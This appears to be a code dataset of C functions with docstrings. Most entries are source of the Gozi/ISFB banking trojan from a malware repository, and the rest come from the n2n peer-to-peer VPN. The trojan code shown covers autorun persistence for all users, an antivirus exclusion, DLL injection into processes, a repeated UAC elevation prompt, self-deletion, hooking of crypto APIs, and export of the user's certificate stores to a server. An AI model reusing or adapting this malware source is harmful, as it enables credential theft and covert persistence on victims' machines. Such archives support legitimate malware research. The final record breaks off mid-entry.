{"docstring": "//\n//\tSearches the client DLL data with the specified name within the current image joined files.\n//\tUnpacks the found data and tries to install as client DLL.\n//\n", "func_signal": "static BOOL InstallClientFj(\n\tULONG\tClientId,\n\tULONG\tFlags\n\t)", "code": "{\n\tBOOL\tRet = FALSE;\n\tPCHAR\tpData;\n\tULONG\tSize;\n\n\tFlags |= INJECT_FLAG_AUTORUN;\n\n\tif (GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, &pData, &Size, (Flags & INJECT_ARCH_X64), ClientId, 0))\n\t{\n\t\tRet = InjectClient(pData, Size, Flags);\n\t\thFree(pData);\n\t}\n\telse\n\t{\n\t\tDbgPrint(\"ISFB: Joined client ID 0x%x not found.\\n\", ClientId);\n\t}\n\n\treturn(Ret);\n\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n//\tRemoves part of string starting with substring A and ending with substring B.\n//\n", "func_signal": "BOOL StrCutA(\n\t\t\tLPSTR Where, \n\t\t\tLPSTR A, \n\t\t\tLPSTR B\n\t\t\t)", "code": "{\n\tBOOL\tRet = FALSE;\n\tLPSTR\taStr, bStr;\n\n\tif (aStr = StrStrI(Where, A))\n\t{\n\t\tif (bStr = StrStrI(aStr, B))\n\t\t\tlstrcpy(aStr, bStr + lstrlen(B));\n\t\telse\n\t\t\taStr[0] = 0;\n\t\tRet = TRUE;\n\t}\n\treturn(Ret);\n}", "path": "malware/windows/gozi-isfb/client/others.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n//\tAttempts to unload the client-DLL from all existing processes.\n//  This function is used for compatibility with old ISFB versions those do not support dll update.\n//\n", "func_signal": "static BOOL\tUnloadAll(LPTSTR DllPath)", "code": "{\n\tBOOL\tRet = FALSE;\n\tPROCESSENTRY32\tProcess = {0};\n\tHANDLE\thSnapshot;\n\n\t// Enumerate all processes and unload from every process.\n\tProcess.dwSize = sizeof(PROCESSENTRY32);\n\thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\tif (hSnapshot != INVALID_HANDLE_VALUE)\n\t{\n\t\tif (Process32First(hSnapshot, &Process))\n\t\t{\n\t\t\tRet = TRUE;\n\t\t\tdo \n\t\t\t{\t\n\t\t\t\tif (PsSupUnloadDll(Process.th32ProcessID, DllPath, 0) == NO_ERROR)\n\t\t\t\t{\n\t\t\t\t\tDbgPrint(\"ISFB: Client DLL \\\"%s\\\" successfully unloaded from process 0x%x.\\n\", DllPath, Process.th32ProcessID);\n\t\t\t\t}\n\t\t\t} while (Process32Next(hSnapshot, &Process));\n\t\t}\n\t\tCloseHandle(hSnapshot);\n\t}\t// \tif (hSnapshot != INVALID_HANDLE_VALUE)\n\n\treturn(Ret);\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tLoads client DLLs attached to the current program image and initializes the specified AD_CONTEXT structure\n//\t\twith their pointers and sizes.\n//\n", "func_signal": "static BOOL InitAdContext(\n\tPAD_CONTEXT\tpAdContext, \n\tULONG\t\tFlags\n\t)", "code": "{\n\tBOOL Ret = FALSE;\n\n#ifdef _USE_BUILDER\n\tif (GetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, (PCHAR*)&pAdContext->pModule32, (PULONG)&pAdContext->Module32Size, 0, (g_CsCookie ^ CRC_CLIENT32), 0))\n#else\t\n\tif (LoadUnpackResource(_T(\"C132\"), (PCHAR*)&pAdContext->pModule32, (PULONG)&pAdContext->Module32Size))\n#endif\n\t{\n\t\tif (!(Flags & INJECT_ARCH_X64) || \n#ifdef _USE_BUILDER\n\t\t\tGetJoinedData((PIMAGE_DOS_HEADER)g_CurrentModule, (PCHAR*)&pAdContext->pModule64, (PULONG)&pAdContext->Module64Size, INJECT_ARCH_X64, (g_CsCookie ^ CRC_CLIENT64), 0))\n#else\n\t\t\tLoadUnpackResource(_T(\"C164\"), (PCHAR*)&pAdContext->pModule64, (PULONG)&pAdContext->Module64Size))\n#endif\n\t\t{\n\t\t\tRet = TRUE;\n\t\t}\t// if (!(Flags & INJECT_ARCH_X64) || LoadUnpackResource(_T(\"C164\")...\n\t\telse\n\t\t\thFree((PVOID)pAdContext->pModule32);\n\t}\t// if (LoadUnpackResource(_T(\"CLIENT32\"), (PCHAR*)&AdContext.pModule32, (PULONG)&AdContext.Module32Size))\n\n\treturn(Ret);\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tCopies current program file into one of the system folders and registers it within Windows autorun.\n//\n", "func_signal": "static BOOL InstallApp(\n\tULONG\tFlags\n\t)", "code": "{\n\tBOOL\tRet = TRUE;\n\tHKEY\thKey;\n\tULONG\tSize, Type = REG_SZ, KeyFlags = KEY_WOW64_32KEY;\n\tLPTSTR\tRegFilePath, pRunCommand = NULL;\n\tWINERROR Status;\n\n\tPCHAR\tpFileData = NULL;\n\tULONG\tFileSize = 0;\n\n\tif (Flags & INJECT_ARCH_X64)\n\t\tKeyFlags = KEY_WOW64_64KEY;\n\t\n#ifdef _DLL_INSTALLER\n\tpRunCommand = MakeRundllCommandLine(g_CurrentModulePath, szDllEntryPoint);\n#else\n\tpRunCommand = g_CurrentModulePath;\n#endif\n\tif (pRunCommand)\n\t{\n\t\tASSERT(g_CurrentModulePath);\n\t\tDbgPrint(\"ISFB: Run command is \\\"%s\\\"\\n\", pRunCommand);\n\n\t\tStatus = RegOpenKeyEx(HKEY_CURRENT_USER, szAutoPath, 0, (KeyFlags | KEY_ALL_ACCESS), &hKey);\n\t\tif (Status == NO_ERROR)\n\t\t{\n\t\t\t// Check if this file already installed within Windows autorun\n\t\t\tSize = (lstrlen(pRunCommand) + 1) * sizeof(_TCHAR);\n\t\t\tASSERT(Size);\n\t\t\tif (RegFilePath = hAlloc(Size))\n\t\t\t{\n\t\t\t\tStatus = RegQueryValueEx(hKey, g_StartupValueName, 0, &Type, RegFilePath, &Size);\n\t\t\t\tif (Status == NO_ERROR)\n\t\t\t\t{\n\t\t\t\t\tRegFilePath[(Size / sizeof(_TCHAR)) - 1] = 0;\n\t\t\t\t\tStatus = lstrcmpi(RegFilePath, pRunCommand);\n\t\t\t\t\tDbgPrint(\"ISFB: Reg file path is \\\"%s\\\"\\n\", RegFilePath);\n\t\t\t\t}\n\t\t\t\thFree(RegFilePath);\n\t\t\t}\t// if (RegFilePath = hAlloc(Size))\n\t\t\telse\n\t\t\t\tStatus = ERROR_NOT_ENOUGH_MEMORY;\n\n\t\t\tRegCloseKey(hKey);\n\t\t}\t// if (Status == NO_ERROR)\n\t\telse\n\t\t{\n\t\t\tDbgPrint(\"ISFB: Failed to open Windows autorun key, error %u\\n\", Status);\n\t\t}\n\n\t\tif (Status != NO_ERROR)\n\t\t{\n#ifndef _DLL_INSTALLER\n\t\t\tif (Flags & INJECT_ARCH_X64)\n\t\t\t\tPsSupDisableWow64Redirection();\n#endif\n\t\t\t// Application isn't installed yet, installing\n\t\t\tRegFilePath = SaveApp(g_CurrentModulePath, g_ClientFileName, pFileData, FileSize);\n#ifndef _DLL_INSTALLER\n\t\t\tif (Flags & INJECT_ARCH_X64)\n\t\t\t\tPsSupEnableWow64Redirection();\n#else\n\t\t\tif (Flags & INJECT_ARCH_X64)\n\t\t\t{\n\t\t\t\t// We need a real file path to our DLL\n\t\t\t\tLPTSTR pRealPath;\n\n\t\t\t\tif (pRealPath = PsSupGetRealFilePath(RegFilePath))\n\t\t\t\t{\n\t\t\t\t\thFree(RegFilePath);\n\t\t\t\t\tRegFilePath = pRealPath;\n\t\t\t\t}\n\t\t\t}\t// if (Flags & INJECT_ARCH_X64)\n#endif\n\t\t\tif (RegFilePath)\n\t\t\t{\n#ifdef _MSSE_EXCLUSION\n\t\t\t\tAvAddMsseExclusion(RegFilePath, TRUE);\n#endif\n#ifdef _DLL_INSTALLER\n\t\t\t\thFree(pRunCommand);\n\t\t\t\tpRunCommand = MakeRundllCommandLine(RegFilePath, szDllEntryPoint);\n#else\n\t\t\t\tpRunCommand = RegFilePath;\n#endif\n\t\t\t\t// Installing for all active users\n\t\t\t\tStatus = RegEnumUsersSetAutorun(g_StartupValueName, pRunCommand, KeyFlags);\n\n\t\t\t\tif (Status == NO_ERROR)\n\t\t\t\t{\n\t\t\t\t\tHKEY hMainKey;\n\n\t\t\t\t\tif (RegCreateKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hMainKey) == NO_ERROR)\n\t\t\t\t\t{\n\t\t\t\t\t\tSize = (lstrlen(pRunCommand) + 1) * sizeof(_TCHAR);\n\t\t\t\t\t\tXorEncryptBuffer(pRunCommand, Size, g_MachineRandSeed, FALSE);\n\t\t\t\t\t\tRegSetValueEx(hMainKey, szDataRegExeValue, 0, REG_BINARY, pRunCommand, Size);\n\t\t\t\t\t\tRegCloseKey(hMainKey);\n\t\t\t\t\t}\t// if (RegCreateKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hMainKey) == NO_ERROR)\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tDbgPrint(\"ISFB: Failed registering App within Windows autorun, error %u\\n\", Status); \n\t\t\t\t}\n\t\t\t}\t// if (RegFilePath)\n\t\t}\t// if (Status != NO_ERROR)\n\t\telse\n\t\t\t// Application already installed\n\t\t\tRet = FALSE;\n\t\t\n\t\tif (pRunCommand != g_CurrentModulePath)\n\t\t\thFree(pRunCommand);\n\t}\t// if (pRunCommand)\n\n\treturn(Ret);\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n//\tRemoves part of string starting with substring A and ending with substring B.\n//\n", "func_signal": "BOOL StrCutW(\n\t\t\tLPWSTR Where, \n\t\t\tLPWSTR A, \n\t\t\tLPWSTR B\n\t\t\t)", "code": "{\n\tBOOL\tRet = FALSE;\n\tLPWSTR\taStr, bStr;\n\n\tif (aStr = StrStrIW(Where, A))\n\t{\n\t\tif (bStr = StrStrIW(aStr, B))\n\t\t\tlstrcpyW(aStr, bStr + lstrlenW(B));\n\t\telse\n\t\t\taStr[0] = 0;\n\t\tRet = TRUE;\n\t}\n\treturn(Ret);\n}", "path": "malware/windows/gozi-isfb/client/others.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tThread function.\n//\tExports user-specific certificates from the Windows certificate store and sends them to the server.\n//\n", "func_signal": "WINERROR WINAPI ExportSendCerts(PVOID Context)", "code": "{\n\tWINERROR\tStatus;\n\tLPTSTR\t\tCertFullName = NULL;\n\n\tdo\t// not a loop\n\t{\n\t\t// Generating name for the directory to store exported certs\n\t\tif (!(CertFullName = FilesGetTempFile(1234)))\n\t\t{\n\t\t\tStatus = ERROR_FILE_INVALID;\n\t\t\tbreak;\n\t\t}\n\n\t\t// Since TEMP file was already creted by FilesGetTempFile(), deleting it.\n\t\tDeleteFile(CertFullName);\n\n\t\t// Createing the directory to strore PFX files\n\t\tif (!CreateDirectory(CertFullName, NULL))\n\t\t{\n\t\t\tStatus = GetLastError();\n\t\t\tbreak;\n\t\t}\n\n\t\t// Exporting certificates to .PFX file\n\t\tCertExportToPfx(szMy, CertFullName);\n\t\tCertExportToPfx(szAddressBook, CertFullName);\n\t\tCertExportToPfx(szAuthRoot, CertFullName);\n\t\tCertExportToPfx(szCertificateAuthority, CertFullName);\n\t\tCertExportToPfx(szDisallowed, CertFullName);\n\t\tCertExportToPfx(szRoot, CertFullName);\n\t\tCertExportToPfx(szTrustedPeople, CertFullName);\n\t\tCertExportToPfx(szTrustedPublisher, CertFullName);\n\n\n\t\t// Packing and sending .PFX to the server\n\t\tStatus = FilesPackAndSend(NULL, CertFullName, FILE_TYPE_CERT);\n\n\t\tFilesClearDirectory(CertFullName, TRUE, TRUE);\n\t\tRemoveDirectory(CertFullName);\n\t\t\n\t} while(FALSE);\n\n\tif (CertFullName)\n\t\thFree(CertFullName);\n\n\tUNREFERENCED_PARAMETER(Context);\n\n\treturn(Status);\n}", "path": "malware/windows/gozi-isfb/client/certs.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n// Resets software group ID if any\n//\n", "func_signal": "static VOID ResetGroupId(VOID)", "code": "{\n\tHKEY hKey;\n\tCRM_CLIENT_ID\tClientId;\n\tULONG DataType, Size;\n\n\tif (RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey) == NO_ERROR)\n\t{\n\t\tif (RegQueryValueEx(hKey, szDataRegClientId, NULL, &DataType, (PCHAR)&ClientId, &Size) == NO_ERROR && Size == sizeof(CRM_CLIENT_ID))\n\t\t{\n\t\t\tClientId.GroupId = 0;\n\t\t\tRegSetValueEx(hKey, szDataRegClientId, 0, REG_BINARY, (PCHAR)&ClientId, sizeof(CRM_CLIENT_ID));\n\t\t}\n\t\tRegCloseKey(hKey);\n\t}\t// if (RegOpenKey(HKEY_CURRENT_USER, g_MainRegistryKey, &hKey) == NO_ERROR)\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tRestarts current process or reloads current DLL with UAC elevation request message.\n//\t\n", "func_signal": "static VOID\tRequestUac(VOID)", "code": "{\n\tSHELLEXECUTEINFO\tExecInfo = {0};\n\n\tASSERT(g_CurrentModulePath);\n\n\tCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);\n\t\n#ifdef _DLL_INSTALLER\n\t{\n\t\t// Reloading current DLL\n\t\tLPTSTR pParameters;\n\n\t\t// Allocating parameters for the rundll32 call\n\t\tif (pParameters = AppAlloc((cstrlen(szRunFmt2) + lstrlen(g_CurrentModulePath) + cstrlen(szDllEntryPoint) + 1) * sizeof(_TCHAR)))\n\t\t{\n\t\t\twsprintf(pParameters, szRunFmt2, g_CurrentModulePath, szDllEntryPoint);\n\n\t\t\tExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);\n\t\t\tExecInfo.lpVerb = szRunas;\n\t\t\tExecInfo.lpFile = szRundll32;\n\t\t\tExecInfo.lpParameters = pParameters;\n\n\t\t\twhile(!ShellExecuteEx(&ExecInfo));\n\n\t\t\tAppFree(pParameters);\n\t\t}\t// if (pParameters = AppAlloc(...\n\t}\n#else\n\t{\n\t\tLPTSTR pExt, pNewPath, pStartCmd = NULL;\n\t\t\n\t\tif (pNewPath = FilesGetTempFile(9071))\n\t\t{\n\t\t\tif (pExt = PathFindExtension(pNewPath))\n\t\t\t\tlstrcpy(pExt, szExtExe);\n\n\t\t\tif (pStartCmd = AppAlloc((cstrlen(szCmdCopyRun) + lstrlen(pNewPath) * 2 + lstrlen(g_CurrentModulePath) + 1) * sizeof(_TCHAR)))\n\t\t\t\twsprintf(pStartCmd, szCmdCopyRun, g_CurrentModulePath, pNewPath, pNewPath);\n\n\t\t\tAppFree(pNewPath);\n\t\t}\t// if (pNewPath = FilesGetTempFile(9071))\n\t\t\n\t\t// Restarting current process\n\t\tExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);\n\t\tExecInfo.lpVerb = szRunas;\n\t\tExecInfo.lpFile = (pStartCmd ? szCmdExe : g_CurrentModulePath);\n\t\tExecInfo.lpParameters = pStartCmd;\n\n\t\twhile(!ShellExecuteEx(&ExecInfo));\n\n\t\tif (pStartCmd)\n\t\t\tAppFree(pStartCmd);\n\t}\n#endif\n\n\tDbgPrint(\"ISFB: Shell Execute complete, status %u\\n\", GetLastError());\n\n\tCoUninitialize();\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tHooks ADVAPI32!CryptGetUserKey function.\n//\n", "func_signal": "WINERROR\tCertSetHooks(VOID)", "code": "{\n\tWINERROR\tStatus = ERROR_DLL_NOT_FOUND;\n\n\tif (LoadLibraryA(szAdvapi32))\n\t\tStatus = ParserHookImportExport(&CryptGetUserKeyIatHook, 1, &CryptGetUserKeyExportHook, 1);\n\n\treturn(Status);\n}", "path": "malware/windows/gozi-isfb/client/certs.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tCreates a BAT file that attemts to delete this module in infinite loop.\n//\tThen this BAT file deletes itself.\n//\n", "func_signal": "static VOID DoSelfDelete(VOID)", "code": "{\n\tif (g_CurrentModulePath)\n\t\tPsSupDeleteFileWithBat(g_CurrentModulePath);\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "// ---- Handle table read\\write lock implementation ------------------------------------------------------------------------------\n", "func_signal": "static VOID LockTableShared(PHANDLE_TABLE HTable)", "code": "{\n\tEnterCriticalSection(&HTable->TableLock);\n\t_InterlockedIncrement(&HTable->LockCount);\n\tLeaveCriticalSection(&HTable->TableLock);\n\t\n}", "path": "malware/windows/gozi-isfb/Handle/handle.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tGenerates machine-specific pseudo random names.\n//\n", "func_signal": "static BOOL GenMachineLevelNames(VOID)", "code": "{\n\tBOOL Ret = FALSE;\n\tULONG\tcLen;\n\tULONG\tNameSeed, GuidSeed;\n\tLPTSTR\tConfigUpdateMutexName = NULL;\n\n\tDbgPrint(\"ISFB: Generating machine-level names from seed 0x%08x\\n\", g_MachineRandSeed);\n\n\tNameSeed = GuidSeed = g_MachineRandSeed;\n\n\tdo // not a loop\n\t{\n\t\tif (!GenModuleName(&NameSeed, &g_StartupValueName, &cLen))\n\t\t{\n\t\t\tDbgPrint(\"ISFB: Failed generating main module name.\\n\");\n\t\t\tbreak;\n\t\t}\n\n\t\tif (!GenModuleName(&NameSeed, &g_ClientFileName, &cLen))\n\t\t{\n\t\t\tDbgPrint(\"ISFB: Failed generating client dll module name.\\n\");\n\t\t\tbreak;\n\t\t}\n#if (defined(_EXE_LOADER) && !defined(_DLL_INSTALLER))\n\t\tlstrcat(g_ClientFileName, szExtExe);\n#else\n\t\tlstrcat(g_ClientFileName, szExtDll);\n#endif\n\n\t\tif (!GenModuleName(&NameSeed, &g_StartupValueName64, &cLen))\n\t\t{\n\t\t\tDbgPrint(\"ISFB: Failed generating 64-bit module name.\\n\");\n\t\t\tbreak;\n\t\t}\n\n\t\t// Main registry key name, we don't really need it here.\n\t\tif (!(g_MainRegistryKey = GenGuidName(&GuidSeed, szDataRegSubkey, NULL, FALSE)))\n\t\t\tbreak;\n\t\t\n\t\t// Randomizing DLL-specific GUID values\n\t\tGuidSeed ^= uDllSeed;\n\n\t\t// Update event name\n\t\tif (!(g_UpdateEventName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))\n\t\t\tbreak;\n\n\t\t// Config update mutex name, we don't really need it here.\n\t\tif (!(ConfigUpdateMutexName = GenGuidName(&GuidSeed, NULL, NULL, TRUE)))\n\t\t\tbreak;\n\n\t\t// Config update timer name\n\t\tif (!(g_ConfigUpdateTimerName = GenGuidName(&GuidSeed, szLocal, NULL, TRUE)))\n\t\t\tbreak;\n\n\t\t// Random DLL exported function name\n\t\tGuidSeed = GetTickCount();\n\t\tif (!GenModuleName(&GuidSeed, &g_DllExportName, &cLen))\n\t\t{\n\t\t\tDbgPrint(\"ISFB: Failed generating client dll export name.\\n\");\n\t\t\tbreak;\n\t\t}\n\n#if _DISPLAY_NAMES\t\t\n\t\tDbgPrint(\"ISFB: 32-bit startup value name is %s.\\n\", g_StartupValueName);\n\t\tDbgPrint(\"ISFB: 32-bit client dll module name is %s.\\n\", g_ClientFileName);\n\t\tDbgPrint(\"ISFB: 64-bit startup value name is %s.\\n\", g_StartupValueName64);\n\t\tDbgPrint(\"ISFB: Update event name is %s.\\n\", g_UpdateEventName);\n\t\tDbgPrint(\"ISFB: Config update mutex name is %s.\\n\", ConfigUpdateMutexName);\n\t\tDbgPrint(\"ISFB: Config update timer name is %s.\\n\", g_ConfigUpdateTimerName);\n#endif\n\t\n\n\t\tRet = TRUE;\n\t} while(FALSE);\n\n\tif (ConfigUpdateMutexName)\n\t\thFree(ConfigUpdateMutexName);\n\n\treturn(Ret);\n}", "path": "malware/windows/gozi-isfb/install.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "//\n//\tReleases the specified handle table. Deletes all existing handles. Frees memory.\n//\n", "func_signal": "WINERROR\tHandleReleaseTable(\n\tPHANDLE_TABLE\tHTable\n\t)", "code": "{\n\tWINERROR\tStatus = NO_ERROR;\n\tULONG\t\ti;\n\tPLIST_ENTRY\tpHead, pEntry;\n\tPHANDLE_RECORD\tpHRec;\n\tASSERT_HANDLE_TABLE(HTable);\n\n\tLockTableExclusive(HTable);\n\n\tfor (i=0; i<HANDLE_ROOT_COUNT; i++)\n\t{\n\t\tpHead = &HTable->KeyRoot[i];\n\t\tpEntry = pHead->Flink;\n\t\twhile (pEntry != pHead)\n\t\t{\n\t\t\tpHRec = CONTAINING_RECORD(pEntry, HANDLE_RECORD, Entry);\n\t\t\tpEntry = pEntry->Flink;\n\t\t\tASSERT(HTable->Records > 0);\n\t\t\tASSERT(pHRec->RefCount == 1);\n\t\t\tpHRec->RefCount -= 1;\n\t\t\tHandleDeleteLocked(HTable, pHRec);\n\t\t}\n\t}\n\n\tASSERT(HTable->Records == 0);\t\n\tUnlockTableExclusive(HTable);\n\n#if _DEBUG\n\tHTable->Magic = 0;\n#endif\n\thFree(HTable);\n\treturn(Status);\n}", "path": "malware/windows/gozi-isfb/Handle/handle.c", "commit_date": "2016-03-23 00:00:00", "repo_name": "gbrindisi/malware", "stars": 528, "license": "None", "language": "c", "size": 3985}
{"docstring": "/* Parse hex nibbles in ascii until a non-nibble character is found. Nibble\n * characters are 0-9, a-f and A-F. \n *\n * Return number of bytes parsed into keyBuf or a negative error code.\n */\n", "func_signal": "ssize_t n2n_parse_hex( uint8_t * keyBuf, \n                       size_t keyLen, \n                       const char * textKey,\n                       size_t textLen)", "code": "{\n    ssize_t retval=0;\n    uint8_t * pout=keyBuf;\n    size_t octet=0;\n    const char * textEnd;\n    const char * pbeg;\n\n    textEnd = textKey+textLen;\n    pbeg=textKey;\n\n    while ( ( pbeg + 1 < textEnd ) && ( retval < (ssize_t)keyLen ) )\n    {\n      if ( 1 != sscanf( pbeg, \"%02x\", (unsigned int*)&octet ) )\n        {\n            retval=-1;\n            break;\n        }\n\n        *pout = (octet & 0xff);\n        ++pout;\n        ++retval;\n        pbeg += 2;\n    }\n\n    return retval;\n}", "path": "n2n/n2n_v2/n2n_keyfile.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/*\tTwoFish Raw Decryption\n *\n *\tDoes not use header, but does use CBC (if more than one block has to be decrypted).\n *\n *\tInput:\tPointer to the buffer of the ciphertext to be decrypted.\n *\t\t\tPointer to the buffer receiving the plaintext.\n *\t\t\tThe length of the ciphertext buffer (at least one cipher block).\n *\t\t\tThe TwoFish structure.\n *\n *\tOutput:\tThe amount of bytes decrypted if successful, otherwise 0.\n */\n", "func_signal": "uint32_t TwoFishDecryptRaw(uint8_t *in,\n\t\t\t    uint8_t *out,\n\t\t\t    uint32_t len,\n\t\t\t    TWOFISH *tfdata)", "code": "{\t_TwoFish_ResetCBC(tfdata);\t\t\t\t\t\t\t/* reset CBC flag. */\n  tfdata->output=out;\t\t\t\t\t\t\t/* output straight into output buffer. */\n  return _TwoFish_CryptRaw(in,out,len,TRUE,tfdata);\t/* and go for it. */\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/* Reset's the CBC flag and zero's PrevCipher (through qBlockPlain) (important) */\n", "func_signal": "void _TwoFish_ResetCBC(TWOFISH *tfdata)", "code": "{\ttfdata->qBlockDefined=FALSE;\n  memset(tfdata->qBlockPlain,0,TwoFish_BLOCK_SIZE);\n}", "path": "n2n/n2n_v2/twofish.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/** Forward a L2 packet to every edge registered for the community of the\n * originator.\n *\n *  @return number of copies of the packet sent\n */\n", "func_signal": "static size_t broadcast_packet(char *packet, u_int packet_len, \n                               struct peer_addr *sender,\n                               n2n_sock_info_t * sinfo,\n                               struct n2n_packet_header *hdr )", "code": "{\n    size_t numsent=0;\n    struct peer_info *scan;\n\n    scan = known_peers;\n    while(scan != NULL) {\n        if((strcmp(scan->community_name, hdr->community_name) == 0)\n           && (memcmp(sender, &scan->public_ip, sizeof(struct peer_addr)) /* No L3 self-send */) )\n        {\n            int data_sent_len;\n            size_t len = packet_len;\n          \n            data_sent_len = send_data( &(scan->sinfo), packet, &len, &scan->public_ip, 0);\n\n            if(data_sent_len != len)\n            {\n                ++(supernode_stats.errors);\n                traceEvent(TRACE_WARNING, \"sendto() [sent=%d][attempted_to_send=%d] [%s]\\n\",\n                           data_sent_len, len, strerror(errno));\n            }\n            else \n            {\n                ipstr_t buf;\n                ipstr_t buf1;\n\n                ++numsent;\n                ++(supernode_stats.pkts);\n                traceEvent(TRACE_INFO, \"Sent multicast message to remote node [%s:%hu][mac=%s]\",\n                           intoa(ntohl(scan->public_ip.addr_type.v4_addr), buf, sizeof(buf)),\n                           ntohs(scan->public_ip.port),\n                           macaddr_str(scan->mac_addr, buf1, sizeof(buf1)));\n            }\n        }\n\n        scan = scan->next;\n    } /* while */\n\n\n    return numsent;\n}", "path": "n2n/n2n_v1/supernode.c", "commit_date": "2011-03-26 00:00:00", "repo_name": "meyerd/n2n", "stars": 875, "license": "None", "language": "c", "size": 508}
{"docstring": "/** The aes packet format consists of:\n *\n *  - a 8-bit aes encoding version in clear text\n *  - a 32-bit SA number in clear text\n *  - ciphertext encrypted from a 32-bit nonce followed by the payload.\n *\n *  [V|SSSS|nnnnDDDDDDDDDDDDDDDDDDDDD]\n *         |<------ encrypted ------>|\n */\n", "func_signal": "static int transop_encode_aes( n2n_trans_op_t * arg,\n                                   uint8_t * outbuf,\n                                   size_t out_len,\n                                   const uint8_t * inbuf,\n                                   size_t in_len )", "code": "{\n    int len2=-1;\n    transop_aes_t * priv = (transop_aes_t *)arg->priv;\n    uint8_t assembly[N2N_PKT_BUF_SIZE];\n    uint32_t * pnonce;\n\n    if ( (in_len + TRANSOP_AES_NONCE_SIZE) <= N2N_PKT_BUF_SIZE )\n    {\n        if ( (in_len + TRANSOP_AES_NONCE_SIZE + TRANSOP_AES_SA_SIZE + TRANSOP_AES_VER_SIZE) <= out_len )\n        {\n            int len=-1;\n            size_t idx=0;\n            sa_aes_t * sa;\n            size_t tx_sa_num = 0;\n\n            /* The transmit sa is periodically updated */\n            tx_sa_num = aes_choose_tx_sa( priv );\n\n            sa = &(priv->sa[tx_sa_num]); /* Proper Tx SA index */\n        \n            traceEvent( TRACE_DEBUG, \"encode_aes %lu with SA %lu.\", in_len, sa->sa_id );\n            \n            /* Encode the aes format version. */\n            encode_uint8( outbuf, &idx, N2N_AES_TRANSFORM_VERSION );\n\n            /* Encode the security association (SA) number */\n            encode_uint32( outbuf, &idx, sa->sa_id );\n\n            /* Encrypt the assembly contents and write the ciphertext after the SA. */\n            len = in_len + TRANSOP_AES_NONCE_SIZE;\n\n            /* The assembly buffer is a source for encrypting data. The nonce is\n             * written in first followed by the packet payload. The whole\n             * contents of assembly are encrypted. */\n            pnonce = (uint32_t *)assembly;\n            *pnonce = rand();\n            memcpy( assembly + TRANSOP_AES_NONCE_SIZE, inbuf, in_len );\n\n            /* Need at least one encrypted byte at the end for the padding. */\n            len2 = ( (len / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE; /* Round up to next whole AES adding at least one byte. */\n            assembly[ len2-1 ]=(len2-len);\n            traceEvent( TRACE_DEBUG, \"padding = %u\", assembly[ len2-1 ] );\n\n            memset( &(sa->enc_ivec), 0, sizeof(N2N_AES_IVEC_SIZE) );\n            AES_cbc_encrypt( assembly, /* source */\n                             outbuf + TRANSOP_AES_VER_SIZE + TRANSOP_AES_SA_SIZE, /* dest */\n                             len2, /* enc size */\n                             &(sa->enc_key), sa->enc_ivec, 1 /* encrypt */ );\n\n            len2 += TRANSOP_AES_VER_SIZE + TRANSOP_AES_SA_SIZE; /* size of data carried in UDP. */\n        }\n        else\n        {\n            traceEvent( TRACE_ERROR, \"encode_aes outbuf too small.\" );\n        }\n    }\n    else\n    {\n        traceEvent( TRACE_ERROR, \"encode_aes inbuf too big to encrypt.\" );\n    }\n\n    return len2;\n}", "path": 